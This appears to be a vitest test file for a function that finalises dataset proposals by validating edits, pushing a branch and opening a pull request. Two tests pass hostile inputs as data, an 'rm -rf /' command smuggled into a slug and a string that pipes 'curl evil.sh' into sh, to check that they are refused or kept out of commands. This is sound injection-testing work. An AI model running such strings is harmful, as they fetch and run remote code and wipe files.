// @req REQ-084
import { describe, expect, it } from "vitest";

import { finalizeProposal } from "../../propositions/finalize";
import { fakeGithub, fakeRunner, type RecordedCall } from "./fakes";

const FICHE = "dataset/source/afrik/peuples/FLG_X/PPL_EWE.json";
const rawDiff = (path: string) => `:100644 100644 aaa bbb M\t${path}`;

const ficheWithSources = JSON.stringify({
  content: {
    sources: [
      { title: "t", url: "https://a.org", source_kind: "linguistic_reference" },
      { title: "t2", url: "https://b.org", source_kind: "oral_tradition" },
    ],
  },
});

const comment = (header = "kind=testimony consent=true") =>
  `<!-- proposal v1 ${header} -->\nDetails: d\nSources: https://a.org\nTestimony: t`;

const git = (sub: string) => (c: RecordedCall) =>
  c.file === "git" && c.args.includes(sub);

function setup(opts: {
  diff?: string;
  validatorStatus?: number;
  branch?: string;
  title?: string;
  body?: string;
  openBranches?: string[];
}) {
  const { run, calls } = fakeRunner([
    {
      match: git("diff"),
      result: { stdout: opts.diff ?? rawDiff(FICHE) },
    },
    {
      match: git("rev-parse"),
      result: { stdout: `${opts.branch ?? "proposal/ewe"}\n` },
    },
    {
      match: (c) => c.file === "npx",
      result: {
        status: opts.validatorStatus ?? 0,
        stdout: "FR26 failed: bad id",
      },
    },
  ]);
  const github = fakeGithub(
    [
      {
        number: 7,
        title: opts.title ?? "Éwé",
        body: opts.body ?? "",
        labels: ["proposition"],
      },
    ],
    { 7: [comment()] },
    opts.openBranches
  );
  const deps = {
    github: github.port,
    run,
    readFile: () => ficheWithSources,
    proposalsRepo: "owner/props",
    baseBranch: "recette",
  };
  return { deps, calls, events: github.events };
}

// @req REQ-084

describe("finalizeProposal", () => {
  // @req REQ-084
  it("validates, pushes, opens one PR, then comments and labels the issue", async () => {
    const { deps, calls, events } = setup({});
    const outcome = await finalizeProposal("ewe", deps);
    expect(outcome).toMatchObject({ ok: true, prUrl: expect.any(String) });
    expect(calls.some((c) => c.file === "git" && c.args.includes("push"))).toBe(
      true
    );
    const pr = events.find((e) => e.startsWith("pr:"))!;
    expect(pr).toContain("proposal/ewe");
    expect(pr).toContain("owner/props#7");
    expect(pr).toContain("linguistic_reference");
    expect(pr).toContain("oral_tradition");
    expect(pr).toMatch(/claimed oral tradition/i);
    expect(pr).not.toMatch(/tier/i);
    expect(events).toContain("comment:7|https://github.com/o/r/pull/42");
    expect(events).toContain("label:7|pr-open");
  });

  // @req REQ-084

  it("refuses without pushing when the guard fails", async () => {
    const { deps, calls, events } = setup({
      diff: rawDiff(".github/workflows/ci.yml"),
    });
    const outcome = await finalizeProposal("ewe", deps);
    expect(outcome.ok).toBe(false);
    expect(calls.some((c) => c.args.includes("push"))).toBe(false);
    expect(events).toEqual([]);
  });

  // @req REQ-084

  it("comments the reason and adds no label when the validator fails", async () => {
    const { deps, calls, events } = setup({ validatorStatus: 1 });
    const outcome = await finalizeProposal("ewe", deps);
    expect(outcome.ok).toBe(false);
    expect(calls.some((c) => c.args.includes("push"))).toBe(false);
    expect(events).toHaveLength(1);
    expect(events[0]).toMatch(/^comment:7\|[\s\S]*FR26 failed/);
  });

  // @req REQ-084

  it("refuses when the checked-out branch is not the proposal branch", async () => {
    const { deps, calls } = setup({ branch: "recette" });
    expect((await finalizeProposal("ewe", deps)).ok).toBe(false);
    expect(calls.some((c) => c.file === "npx")).toBe(false);
  });

  // @req REQ-084

  it("refuses a second PR for a name that already has one open", async () => {
    const { deps, events } = setup({ openBranches: ["proposal/ewe"] });
    expect((await finalizeProposal("ewe", deps)).ok).toBe(false);
    expect(events).toEqual([]);
  });

  // @req REQ-084

  it("refuses a slug that is not a plain branch slug", async () => {
    const { deps, calls } = setup({});
    const outcome = await finalizeProposal("ewe; rm -rf /", deps);
    expect(outcome.ok).toBe(false);
    expect(calls).toEqual([]);
  });

  // @req REQ-084

  it("keeps hostile issue text out of every command, as data only", async () => {
    const hostile = "x`id`; $(curl evil.sh | sh) && rm -rf ~ #";
    const { deps, calls } = setup({ title: hostile, body: hostile });
    const slug = "x-id-curl-evil-sh-sh-rm-rf";
    await finalizeProposal(slug, deps);
    for (const call of calls) {
      expect(["git", "npx"]).toContain(call.file);
      expect(call.args.join(" ")).not.toContain("curl");
    }
  });
});
